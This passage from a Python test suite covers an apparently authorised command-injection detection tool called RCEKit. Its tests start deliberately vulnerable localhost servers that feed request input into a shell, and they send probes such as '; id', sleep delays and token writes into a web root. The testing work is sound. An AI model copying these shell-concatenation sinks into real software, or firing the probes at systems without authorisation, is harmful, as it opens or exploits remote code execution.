    sink that base64/hex/url/unicode-encodes command output is still confirmed."""

    def setUp(self):
        self.gen = RCEKit()

    def test_matches_output_through_common_wrappers(self):
        import base64
        out = "uid=0(root) gid=0(root)"
        pat = r"uid=\d+"
        self.assertTrue(self.gen._encoded_search(pat, out))
        self.assertTrue(self.gen._encoded_search(pat, "b64:" + base64.b64encode(out.encode()).decode()))
        self.assertTrue(self.gen._encoded_search(pat, "hex=" + out.encode().hex()))
        self.assertTrue(self.gen._encoded_search(pat, "q=uid%3D0%28root%29"))

    def test_no_false_positive_on_benign_body(self):
        self.assertFalse(self.gen._encoded_search(r"uid=\d+", "welcome — 49 documents processed"))


class VerifyChainTestCase(unittest.TestCase):
    """O2: the session-aware multi-step chain runner reaches sinks a single
    stateless request cannot — confirming in-band (match oracle) and out-of-band
    (a {callback} URL received by the built-in listener)."""

    def setUp(self):
        self.gen = RCEKit()

    @staticmethod
    def _free_port():
        import socket
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
        s.close()
        return port

    def test_chain_confirms_in_band_via_multi_step_flow(self):
        import http.server, socketserver, threading, re as _re, urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):  # token page whose value a later step must reuse
                self.send_response(200); self.end_headers()
                self.wfile.write(b"session TOKEN=abc123 ready")

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                cmd = up.parse_qs(body).get("cmd", [""])[0]
                pipe = sh_popen("echo " + cmd + " 2>&1")  # command injection sink
                out = pipe.read(); pipe.close()
                self.send_response(200); self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            chain = {
                "base": f"http://127.0.0.1:{port}",
                "confirm_step": "run",
                "steps": [
                    {"name": "tok", "method": "GET", "path": "/session",
                     "extract": {"tok": r"TOKEN=(\w+)"}},
                    {"name": "run", "method": "POST", "path": "/run",
                     "form": {"session": "{tok}", "cmd": "FUZZ"}},
                ],
            }
            records = list(self.gen.generate_payload_records(
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"]))
            results = self.gen.run_verification_chain(records, chain)
            confirmed = [r for r in results if r["verdict"] == "executed"]
            self.assertTrue(confirmed, "the chain must confirm at least one RCE")
            self.assertTrue(any(r["payload"] == "; id" for r in confirmed))
        finally:
            server.shutdown(); server.server_close()

    def test_chain_confirms_out_of_band_via_builtin_listener(self):
        import http.server, socketserver, threading, re as _re, urllib.request

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode()
                # Simulate blind execution: the "command" fetches the callback URL.
                m = _re.search(r"https?://\S+", body)
                if m:
                    try:
                        urllib.request.urlopen(m.group(0).strip("'\""), timeout=3).read()
                    except Exception:
                        pass
                self.send_response(200); self.end_headers(); self.wfile.write(b"queued")

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        listen_port = self._free_port()
        try:
            chain = {
                "base": f"http://127.0.0.1:{port}",
                "callback_host": "127.0.0.1",
                "listen_port": listen_port,
                "steps": [
                    {"name": "exec", "method": "POST", "path": "/exec", "body": "cmd=FUZZ"},
                ],
            }
            rec = make_record(payload="run {callback}", category="oob",
                              expected_channel="response", match=None)
            results = self.gen.run_verification_chain([rec], chain)
            self.assertEqual(results[0]["verdict"], "executed")
            self.assertIn("callback", results[0]["detail"])
        finally:
            server.shutdown(); server.server_close()


class DetectionMethodTestCase(unittest.TestCase):
    """Phase 1 — the ReflectedMath detection method and the method-driven engine.

    The confirmation invariant: a ``executed`` verdict requires a value the
    target *computed* (arithmetic on random operands), never a literal the
    payload already carried. Proven end-to-end against a live ``/vuln`` sink
    that executes vs a ``/reflect`` sink that only echoes — the direct
    false-positive-resistance gate from the design brief.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.method = ReflectedMath(self.gen)

    def test_build_probes_carry_a_computed_expected_value(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probes = self.method.build_probes(rec, _random.Random(1))
        self.assertTrue(probes)
        for probe in probes:
            # The expected value is a sum the payload never spells out literally,
            # so only execution can put it in the response.
            self.assertNotIn(probe.expected, probe.payload)
            # `forbidden` is the un-executed literal, which IS in the payload;
            # its survival in a response means reflection, not execution.
            self.assertIsNotNone(probe.forbidden)
            self.assertIn(probe.forbidden, probe.payload)

    def test_windows_probe_uses_cmd_arithmetic(self):
        import random as _random
        rec = make_record(environment="windows", context="raw")
        probes = self.method.build_probes(rec, _random.Random(1))
        self.assertTrue(probes)
        self.assertIn("set /a", probes[0].payload)

    def test_confirm_distinguishes_execution_reflection_and_control(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(7))[0]
        # Execution: the computed value is present, the literal is gone.
        exec_body = f"output: {probe.expected} done"
        self.assertEqual(
            self.method.confirm(Observation(200, exec_body, control_body="idle"), probe).status,
            "executed")
        # Reflection: the target echoes the payload; the sum is never produced.
        self.assertEqual(
            self.method.confirm(Observation(200, probe.payload, control_body="idle"), probe).status,
            "negative")
        # Value also present without the payload -> not attributable to execution.
        self.assertEqual(
            self.method.confirm(Observation(200, exec_body, control_body=exec_body), probe).status,
            "inconclusive")

    def test_confirm_holds_when_target_also_echoes_the_payload(self):
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(9))[0]
        # The computed value AND the raw expression are both present — the classic
        # command-injection sink that echoes the input (e.g. "PING <input>") while
        # also executing it. The computed value is unforgeable proof of execution,
        # so this must stay `executed`; the reflection is only noted.
        body = f"{probe.expected} but also {probe.forbidden}"
        verdict = self.method.confirm(Observation(200, body, control_body="idle"), probe)
        self.assertEqual(verdict.status, "executed")
        self.assertIn("reflects the payload verbatim", verdict.evidence)

    def test_sink_raw_omits_leading_separator(self):
        # A sink that runs the injected input as the *whole* command (e.g. a
        # qx/$input/ backdoor) has no surrounding command to break out of, so a
        # leading `;` would be a shell syntax error. `--sink-raw` must send the
        # shell probes as bare commands while keeping the computed-value invariant.
        import random as _random
        rec = make_record(environment="unix", context="raw")
        default_probe = ReflectedMath(self.gen).build_probes(rec, _random.Random(3))[0]
        self.assertTrue(default_probe.payload.startswith("; "))
        raw = ReflectedMath(self.gen, {"sink_raw": True}).build_probes(rec, _random.Random(3))
        for probe in raw:
            self.assertFalse(probe.payload.lstrip().startswith(";"))
            # The expected sum is still absent from the payload, so only execution
            # can place it in the response — the invariant is untouched.
            self.assertNotIn(probe.expected, probe.payload)
        self.assertTrue(raw[0].payload.startswith("echo "))
        # The other shell-based methods drop the separator too.
        timing = ParametricTime(self.gen, {"sink_raw": True, "time_base": 2}).build_probes(
            rec, _random.Random(3))
        self.assertTrue(any(p.payload.startswith("sleep ") for p in timing))
        self.assertFalse(any(p.payload.lstrip().startswith(";") for p in timing))
        file_cfg = {"sink_raw": True, "webroot": "/var/www", "web_base_url": "http://t"}
        file_probe = FileBased(self.gen, file_cfg).build_probes(rec, _random.Random(3))[0]
        self.assertTrue(file_probe.payload.startswith("echo "))
        self.assertFalse(file_probe.payload.lstrip().startswith(";"))

    def test_delivery_error_is_error_not_negative(self):
        # status=None means the request never reached the target (delivery/TLS
        # failure). Reporting that as `negative` would read as "not vulnerable",
        # so every method must return `error` instead.
        import random as _random
        rec = make_record(environment="unix", context="raw")
        probe = self.method.build_probes(rec, _random.Random(5))[0]
        self.assertEqual(
            self.method.confirm(Observation(None, "<urlopen error ...>"), probe).status,
            "error")
        fb = FileBased(self.gen, {"webroot": "/var/www", "web_base_url": "http://t"})
        fprobe = fb.build_probes(rec, _random.Random(5))[0]
        self.assertEqual(
            fb.confirm(Observation(None, "err", followup_body=None), fprobe).status, "error")
        pt = ParametricTime(self.gen, {"time_base": 1})
        series = [(p, Observation(None, "err", elapsed=0.0))
                  for p in pt.build_probes(rec, _random.Random(5))]
        self.assertEqual(pt.confirm_series(series).status, "error")

    def test_insecure_is_opt_in(self):
        # Default keeps certificate verification (context None = urllib default);
        # --insecure disables it, like curl -k, only when the operator opts in.
        import ssl
        self.assertIsNone(self.gen._verify_ssl_context())
        self.gen.insecure = True
        ctx = self.gen._verify_ssl_context()
        self.assertEqual(ctx.verify_mode, ssl.CERT_NONE)
        self.assertFalse(ctx.check_hostname)

    def test_insecure_reaches_back_to_a_legacy_tls_stack(self):
        """Not verifying a certificate is not the same as completing a handshake.

        OpenSSL 3.x refuses the key sizes and signature algorithms that software
        of the era this tool gets pointed at still offers, so a context that only
        turned verification off never reaches the target: Webmin 1.910 — the
        build the README's `reflected` row rests on — answers
        `SSLV3_ALERT_HANDSHAKE_FAILURE`, every probe comes back `error`, and the
        sink behind that handshake is never tested at all.

        Asserted on the context rather than against a live legacy server: the
        certificate such a server needs cannot be generated with the standard
        library, and this project takes no dependency to find out."""
        import ssl
        self.gen.insecure = True
        ctx = self.gen._verify_ssl_context()
        strict = ssl.create_default_context()
        # It must reach further back on both axes an old server fails: the
        # protocol floor and the accepted cipher set.
        #
        # The floor is asserted against TLS 1.0 directly rather than compared
        # with the default's. On Python 3.8 and 3.9 that default is the sentinel
        # MINIMUM_SUPPORTED (-2), which marks "whatever this build allows"
        # instead of naming a point on the ordering -- so `ours <= theirs` asks
        # the enum a question it cannot answer, and fails on exactly the two
        # interpreters where the default is already the most permissive value
        # there is.
        self.assertIn(ctx.minimum_version,
                      (ssl.TLSVersion.MINIMUM_SUPPORTED, ssl.TLSVersion.TLSv1),
                      "the permissive context must admit TLS 1.0 or lower")
        lenient = {c["name"] for c in ctx.get_ciphers()}
        modern = {c["name"] for c in strict.get_ciphers()}
        self.assertTrue(modern <= lenient,
                        "the permissive context must keep everything a modern default accepts")
        self.assertTrue(lenient - modern,
                        "the permissive context must accept ciphers a modern default refuses")

    def test_a_run_that_did_not_ask_stays_strict(self):
        # The one thing this must not do: weaken a run that never opted in.
        # Without --insecure the context is still None, which is urllib's own
        # certificate-verifying default.
        fresh = RCEKit()
        self.assertIsNone(fresh._verify_ssl_context())
        self.assertFalse(getattr(fresh, "insecure", False))

    def test_reflected_math_confirms_on_executing_target_only(self):
        # /vuln runs the injected string through a shell (real execution);
        # /reflect echoes it verbatim without executing. ReflectedMath must
        # confirm on the former and never on the latter.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                parsed = up.urlparse(self.path)
                cmd = up.parse_qs(parsed.query).get("cmd", [""])[0]
                self.send_response(200)
                self.end_headers()
                if parsed.path == "/vuln":
                    pipe = sh_popen("echo " + cmd + " 2>&1")  # command-injection sink
                    out = pipe.read()
                    pipe.close()
                else:  # /reflect: echo input, never execute
                    out = cmd
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="unix", context="raw")
            vuln = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/vuln?cmd=FUZZ", methods=["reflected"])
            confirmed = [r for r in vuln if r["verdict"] == "executed"]
            self.assertTrue(confirmed, "ReflectedMath must confirm against an executing sink")
            self.assertTrue(all(r["tier"] == "executed" and r["method"] == "reflected"
                                for r in confirmed))

            reflect = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/reflect?cmd=FUZZ", methods=["reflected"])
            self.assertFalse([r for r in reflect if r["verdict"] == "executed"],
                             "a target that only echoes input must never be confirmed")
        finally:
            server.shutdown()
            server.server_close()

    def test_confirms_echo_back_command_injection(self):
        # Regression for the most common real-world sink: a tool that echoes the
        # input back (e.g. "PING <input> ...") AND executes it. The reflected
        # literal `$((a+b))` must NOT downgrade the genuine RCE — the tag-wrapped
        # computed value is still unforgeable proof of execution.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                ip = up.parse_qs(up.urlparse(self.path).query).get("ip", [""])[0]
                out = sh_popen("ping -c 1 " + ip + " 2>&1").read()  # injection sink
                self.send_response(200)
                self.end_headers()
                # Echoes the raw input verbatim next to the executed output.
                self.wfile.write(f"PING {ip}\n{out}".encode(errors="replace"))

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            rec = make_record(environment="unix", context="raw")
            results = self.gen.run_detection(
                [rec], url=f"http://127.0.0.1:{port}/ping?ip=FUZZ", methods=["reflected"])
            confirmed = [r for r in results if r["verdict"] == "executed"]
            self.assertTrue(confirmed, "echo-back command injection must be confirmed, not downgraded")
        finally:
            server.shutdown()
            server.server_close()

    def test_methods_flag_rejects_unknown_method(self):
        # The CLI validates --methods before firing anything at the target.
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--verify-url", "http://127.0.0.1:9/x?q=FUZZ",
             "--methods", "bogus", "--acknowledge-consent"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertIn("Unknown --methods", result.stdout)


class RawRequestInputTestCase(unittest.TestCase):
    """Phase 2 — the `-r` raw HTTP request input layer. Each injection point is
    marked with FUZZ and routed into the existing verify/detect engine, which
    encodes it for the context it lands in."""

    def test_parse_raw_request_splits_line_headers_and_body(self):
        raw = "POST /api HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/json\r\n\r\n{\"a\":1}"
        req = parse_raw_request(raw)
        self.assertEqual(req["method"], "POST")
        self.assertEqual(req["target"], "/api")
        self.assertEqual(req["host"], "t.example")
        self.assertEqual(req["body"], '{"a":1}')
        self.assertIn(["Content-Type", "application/json"], req["headers"])

    def test_trailing_newline_in_body_does_not_corrupt_last_param(self):
        # A request saved to a file (editor/heredoc) gains a trailing newline;
        # it must not attach to the last body parameter's value — that made
        # e.g. new2 = "test2\n" != new1 and broke form submissions.
        raw = ("POST /f HTTP/1.1\r\nHost: t.example\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n\r\nnew1=t&new2=t\n")
        self.assertEqual(parse_raw_request(raw)["body"], "new1=t&new2=t")
        _, _, data, _, _ = build_request_inputs(raw, param="new2")
        self.assertEqual(data, "new1=t&new2=FUZZ")
        # Every trailing newline is dropped; internal newlines are preserved.
        multi = "POST /a HTTP/1.1\r\nHost: t.example\r\n\r\nline1\nline2\n\n\n"
        self.assertEqual(parse_raw_request(multi)["body"], "line1\nline2")

    def test_query_param_marker_preserves_other_params(self):
        raw = "GET /lookup?host=example.com&x=1 HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, method, data, headers, injection = build_request_inputs(raw, param="host")
        self.assertEqual(url, "http://t.example/lookup?host=FUZZ&x=1")
        self.assertEqual(method, "GET")
        self.assertIsNone(data)
        self.assertIn("query param", injection)

    def test_json_field_marker(self):
        raw = ("POST /api HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/json\r\n\r\n"
               '{"host": "a", "y": 2}')
        url, method, data, headers, injection = build_request_inputs(raw, param="host")
        self.assertEqual(method, "POST")
        self.assertIn('"host": "FUZZ"', data)
        self.assertIn('"y": 2', data)

    def test_form_body_and_cookie_and_header_markers(self):
        form = "POST /f HTTP/1.1\r\nHost: t.example\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=1&b=2"
        _, _, data, _, inj = build_request_inputs(form, param="b")
        self.assertEqual(data, "a=1&b=FUZZ")
        self.assertIn("body param", inj)

        cookie = "GET / HTTP/1.1\r\nHost: t.example\r\nCookie: sid=abc; role=user\r\n\r\n"
        _, _, _, headers, inj = build_request_inputs(cookie, param="role")
        self.assertIn("Cookie: sid=abc; role=FUZZ", headers)
        self.assertIn("cookie", inj)

        header = "GET / HTTP/1.1\r\nHost: t.example\r\nX-Api: key123\r\n\r\n"
        _, _, _, headers, inj = build_request_inputs(header, param="X-Api")
        self.assertIn("X-Api: FUZZ", headers)

    def test_inline_marker_and_scheme_inference(self):
        # `*` marks the point; Host on :443 infers https; Host/Content-Length dropped.
        raw = ("POST /api HTTP/1.1\r\nHost: t.example:443\r\nContent-Type: application/json\r\n"
               "Content-Length: 12\r\n\r\n{\"host\": \"*\"}")
        url, method, data, headers, injection = build_request_inputs(raw)
        self.assertTrue(url.startswith("https://t.example:443/api"))
        self.assertEqual(data, '{"host": "FUZZ"}')
        self.assertEqual(injection, "inline marker")
        self.assertFalse(any(h.lower().startswith(("host:", "content-length:")) for h in headers))

    def test_existing_fuzz_marker_is_respected(self):
        raw = "GET /q?a=FUZZ HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, _, _, _, injection = build_request_inputs(raw)
        self.assertEqual(url, "http://t.example/q?a=FUZZ")
        self.assertEqual(injection, "inline marker")

    def test_portless_host_stays_http_so_lab_targets_keep_working(self):
        # Lab ranges, CTF boxes and internal apps are routinely plain http on a
        # portless host. Defaulting those to https would leave the tool unable
        # to reach its most common targets out of the box, so the default holds
        # and the cleartext risk is surfaced by the CLI instead.
        raw = ("GET /q?a=FUZZ HTTP/1.1\r\nHost: dvwa.local\r\n"
               "Cookie: PHPSESSID=abc\r\n\r\n")
        url, _, _, _, _ = build_request_inputs(raw)
        self.assertTrue(url.startswith("http://"), url)

    def test_explicit_port_decides_the_scheme(self):
        for host, expected in (("t.example:443", "https"), ("t.example:80", "http"),
                               ("t.example:8080", "http"), ("10.0.0.5:8000", "http")):
            with self.subTest(host=host):
                raw = f"GET /q?a=FUZZ HTTP/1.1\r\nHost: {host}\r\n\r\n"
                url, _, _, _, _ = build_request_inputs(raw)
                self.assertTrue(url.startswith(expected + "://"), url)

    def test_request_scheme_override_wins_over_inference(self):
        raw = "GET /q?a=FUZZ HTTP/1.1\r\nHost: t.example\r\n\r\n"
        url, _, _, _, _ = build_request_inputs(raw, scheme="https")
        self.assertTrue(url.startswith("https://"), url)

    def test_missing_marker_and_missing_param_raise(self):
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=1 HTTP/1.1\r\nHost: t.example\r\n\r\n")
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=1 HTTP/1.1\r\nHost: t.example\r\n\r\n", param="nope")
        with self.assertRaises(ValueError):
            build_request_inputs("GET /q?a=* HTTP/1.1\r\n\r\n")  # no Host

    def test_raw_request_drives_detection_end_to_end(self):
        # A raw request marked with -p, routed through run_detection, confirms
        # against an executing sink — proving the -r layer feeds the engine.
        import http.server
        import os
        import socketserver
        import threading
        import urllib.parse as up

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                cmd = up.parse_qs(up.urlparse(self.path).query).get("host", [""])[0]
                out = sh_popen("echo " + cmd + " 2>&1").read()
                self.send_response(200)
                self.end_headers()
                try:
                    self.wfile.write(out.encode(errors="replace"))
                except BrokenPipeError:
                    pass

        server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            raw = (f"GET /vuln?host=example.com HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n")
            url, method, data, headers, injection = build_request_inputs(raw, param="host")
            self.assertEqual(injection, "query param 'host'")
            gen = RCEKit()
            rec = make_record(environment="unix", context="raw")
            results = gen.run_detection([rec], url=url, methods=["reflected"],
                                        method=method, data=data, headers=headers)
            self.assertTrue([r for r in results if r["verdict"] == "executed"],
                            "the -r request must reach the sink and confirm execution")
        finally:
            server.shutdown()
            server.server_close()


class FileBasedTestCase(unittest.TestCase):
    """Phase 3 — the FileBased (self-OOB) detection method. Confirmation requires
    the target to WRITE a random token to a web-reachable file and then serve it
    back; a target that does not execute never produces the file, so it stays
    unconfirmed. State-changing, so every finding carries a cleanup command."""

    def setUp(self):
        self.gen = RCEKit()
        self.config = {"webroot": "/var/www/html", "web_base_url": "https://t.example"}

    def test_not_applicable_without_config(self):
        rec = make_record(environment="unix", context="raw")
        self.assertFalse(FileBased(self.gen).applicable(rec))
        self.assertTrue(FileBased(self.gen, self.config).applicable(rec))

    def test_build_probe_writes_token_and_carries_followup(self):
        import random as _random
        method = FileBased(self.gen, self.config)
        probe = method.build_probes(make_record(environment="unix", context="raw"),
                                    _random.Random(3))[0]
        self.assertIn("echo", probe.payload)
        self.assertIn("/var/www/html/", probe.payload)
        self.assertIn(probe.expected, probe.payload)  # the token is what gets written
        self.assertTrue(probe.followup["url"].startswith("https://t.example/"))
        self.assertIn("rm -f", probe.followup["cleanup"])

    def test_confirm_requires_the_token_in_the_fetched_file(self):
        method = FileBased(self.gen, self.config)
        probe = Probe(payload="; echo TOK123 > /var/www/html/x.txt", expected="TOK123",
                      followup={"url": "https://t.example/x.txt", "cleanup": "rm -f x"})
        # Fetched file contains the token -> confirmed.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body="TOK123\n"), probe).status,
            "executed")
        # File served but without the token (e.g. 404 body) -> negative.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body="not found"), probe).status,
            "negative")
        # Fetch failed entirely -> negative, never confirmed.
        self.assertEqual(
            method.confirm(Observation(200, "ok", followup_body=None), probe).status,
            "negative")
        # Token also present without the payload -> not attributable to execution.
        self.assertEqual(
            method.confirm(Observation(200, "ok", control_body="TOK123",
                                       followup_body="TOK123"), probe).status,
            "inconclusive")

    def test_file_based_end_to_end_writes_and_confirms(self):
        # /vuln executes the injected command (which writes the token file); any
        # other path serves files from the web root. A non-executing sink never
        # creates the file, so it stays unconfirmed.
        import http.server
        import os
        import pathlib
        import socketserver
        import tempfile
        import threading
        import urllib.parse as up

        webroot = shell_writable_dir()

        def make_handler(execute):
            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *a):
                    pass

                def do_GET(self):
                    parsed = up.urlparse(self.path)
                    if parsed.path == "/vuln":
                        cmd = up.parse_qs(parsed.query).get("host", [""])[0]
                        if execute:
                            sh_popen("echo " + cmd + " 2>&1").read()
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(b"ok")
                        return
                    served = pathlib.Path(webroot) / parsed.path.lstrip("/")
                    if served.is_file():
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(served.read_bytes())
                    else:
                        self.send_response(404)
                        self.end_headers()
                        self.wfile.write(b"not found")
            return Handler

        def run(execute):
            server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), make_handler(execute))
            port = server.server_address[1]
            threading.Thread(target=server.serve_forever, daemon=True).start()
            try:
                rec = make_record(environment="unix", context="raw")
                return self.gen.run_detection(
                    [rec], url=f"http://127.0.0.1:{port}/vuln?host=FUZZ", methods=["file"],
                    config={"webroot": webroot, "web_base_url": f"http://127.0.0.1:{port}"})
            finally:
                server.shutdown()
                server.server_close()

        confirmed = [r for r in run(execute=True) if r["verdict"] == "executed"]
        self.assertTrue(confirmed, "an executing+serving sink must confirm file-based RCE")
        self.assertTrue(all(r.get("cleanup") for r in confirmed), "each finding needs a cleanup command")
        self.assertTrue(os.listdir(webroot), "the token file must actually be written")

        self.assertFalse([r for r in run(execute=False) if r["verdict"] == "executed"],
                         "a non-executing sink must never be confirmed")

    def test_methods_flag_file_requires_webroot(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--verify-url", "http://127.0.0.1:9/x?q=FUZZ",
             "--methods", "file", "--acknowledge-consent"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertIn("--webroot", result.stdout)


class ParametricTimeTestCase(unittest.TestCase):
    """Phase 4 — hardened blind timing. A controlled 0/N/2N delay series must
    produce a linear response-time increase; jitter cannot fake it. Timing has
    no computed value, so it never reaches `executed` on its own (I2/I3).

    Its ceiling is `timing-sink`: proven, and about something narrower than
    execution — the target honoured a delay RCEKit injected. It reported
    `needs-review` until 3.0.0, which named the tool's confidence rather than
    the target's behaviour, for a regression with drift modelled out and the
    delay term held three standard errors clear of the residual."""

    def setUp(self):
        self.gen = RCEKit()
        self.method = ParametricTime(self.gen, {"time_base": 2.0, "time_repeats": 2})

    def _series(self, mapping):
        """A regression-phase series. Only ``regress`` probes are judged — the
        screen round exists to pick a separator, not to decide anything — and
        the samples are interleaved rather than grouped by delay so the request
        index does not stand in for the injected delay."""
        samples = [(delay, elapsed) for delay, elapseds in mapping.items()
                   for elapsed in elapseds]
        samples.sort(key=lambda pair: (pair[1] * 7919) % 13)
        return [(Probe(payload="x", expected="", delay_s=delay, phase="regress"),
                 Observation(status=200, body="", elapsed=elapsed))
                for delay, elapsed in samples]

    def test_tier_is_its_own_proven_tier_and_method_is_aggregate(self):
        self.assertEqual(self.method.tier, "timing-sink")
        self.assertTrue(self.method.aggregate)

    def test_the_ceiling_is_not_execution_and_not_a_confidence_word(self):
        """Both halves of the 3.0.0 rework, on the method it turns on.

        The tier must stay out of `executed` -- a delay honoured is not a shell
        honouring it -- and must stop naming a confidence for a measurement
        that has settled."""
        self.assertNotEqual(self.method.tier, rcekit.EXECUTION_TIER)
        self.assertNotEqual(self.method.tier, "needs-review")

    def test_screen_probes_cover_zero_and_n_per_separator(self):
        # Round one only screens: one 0s and one Ns probe per candidate
        # separator, so the expensive regression is never run through a
        # break-out that did not reach a shell.
        import random as _random
        probes = self.method.build_probes(make_record(environment="unix", context="raw"),
                                          _random.Random(1))
        self.assertTrue(all(p.phase == "screen" for p in probes))
        self.assertEqual(sorted({p.delay_s for p in probes}), [0.0, 2.0])
        self.assertTrue(all("sleep" in p.payload for p in probes))

    def test_regression_probes_cover_zero_n_and_two_n(self):
        import random as _random
        record = make_record(environment="unix", context="raw")
        screen = self.method.build_probes(record, _random.Random(1))
        # A separator that delayed by the injected amount unlocks round two.
        series = [(p, Observation(status=200, body="", elapsed=(p.delay_s or 0.0) + 0.1))
                  for p in screen]
        regression = self.method.next_probes(series)
        self.assertTrue(regression)
        self.assertTrue(all(p.phase == "regress" for p in regression))
        self.assertEqual(sorted({p.delay_s for p in regression}), [0.0, 2.0, 4.0])
        # ...all through one separator: a regression blends its probes into a
        # single measurement, so mixing break-outs would destroy the signal.
        self.assertEqual(len({p.separator for p in regression}), 1)

    def test_no_separator_delays_means_no_regression_is_run(self):
        # The screen runs in waves, so "nothing broke out" is only a conclusion
        # once every separator has been tried -- a sink that filters ';' and '|'
        # is exactly the case the sweep exists for.
        import random as _random
        record = make_record(environment="unix", context="raw")
        series, batch = [], self.method.build_probes(record, _random.Random(1))
        waves = 0
        while batch:
            waves += 1
            series += [(p, Observation(status=200, body="", elapsed=0.1)) for p in batch]
            batch = self.method.next_probes(series)
        self.assertGreater(waves, 1, "the held-back separators must still be screened")
        # None is the `raw` rung — a whole-command sink is screened alongside
        # the break-outs, so the timing method finds one without being told.
        self.assertEqual({p.separator for p, _ in series},
                         {"; ", "| ", "|| ", "&& ", "\n", None})
        self.assertFalse([p for p, _ in series if p.phase == "regress"])
        verdict = self.method.confirm_series(series)
        self.assertEqual(verdict.status, "negative")
        self.assertIn("no command separator produced a delay", verdict.evidence)

    def test_a_first_wave_hit_skips_the_rest_of_the_screen(self):
        # Each delayed screen probe costs a real sleep, so the separators held
        # back are never sent once one has already broken out.
        import random as _random
        record = make_record(environment="unix", context="raw")
        screen = self.method.build_probes(record, _random.Random(1))
        series = [(p, Observation(status=200, body="",
                                  elapsed=(p.delay_s or 0.0) + 0.05)) for p in screen]
        nxt = self.method.next_probes(series)
        self.assertTrue(nxt)
        self.assertTrue(all(p.phase == "regress" for p in nxt),
                        "a working separator must go straight to the regression")

    def test_confirm_series_linear_response_is_a_timing_sink(self):
        verdict = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [2.11, 2.09], 4.0: [4.12, 4.08]}))
        self.assertEqual(verdict.status, "timing-sink")
        # The evidence has to say what was proven, since the status no longer
        # says "review this". The old string opened "blind timing candidate".
        self.assertIn("honoured a delay", verdict.evidence)

    def test_latency_drift_is_not_mistaken_for_a_sleep(self):
        # A target that simply gets slower during the run -- progressive load, a
        # rate limiter backing off -- used to produce a textbook-perfect linear
        # fit while being entirely un-injectable, because the probes were fired
        # in ascending delay order and the delay was collinear with the request
        # index. Here every response time comes from the request order alone.
        series = []
        for i, delay in enumerate([2.0, 0.0, 4.0, 4.0, 0.0, 2.0, 0.0, 2.0, 4.0]):
            series.append((Probe(payload="x", expected="", delay_s=delay, phase="regress"),
                           Observation(status=200, body="", elapsed=1.0 * (i + 1))))
        verdict = self.method.confirm_series(series)
        self.assertEqual(verdict.status, "negative")
        self.assertIn("drift", verdict.evidence)

    def test_confirm_series_rejects_flat_jitter_and_nonmonotonic(self):
        flat = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [0.11, 0.13], 4.0: [0.10, 0.12]}))
        self.assertEqual(flat.status, "negative")
        jitter = self.method.confirm_series(
            self._series({0: [0.10, 0.12], 2.0: [3.9, 0.2], 4.0: [0.3, 0.25]}))
        self.assertEqual(jitter.status, "negative")
        nonmono = self.method.confirm_series(
            self._series({0: [0.1, 0.1], 2.0: [4.1, 4.0], 4.0: [2.1, 2.0]}))
        self.assertEqual(nonmono.status, "negative")

    def test_end_to_end_sleeping_sink_is_a_timing_sink_never_executed(self):
        # The sink sleeps for the injected `sleep N`; a linear response must be
        # reported `timing-sink`, never `executed`.
        import http.server
        import re as _re
        import socketserver
        import threading
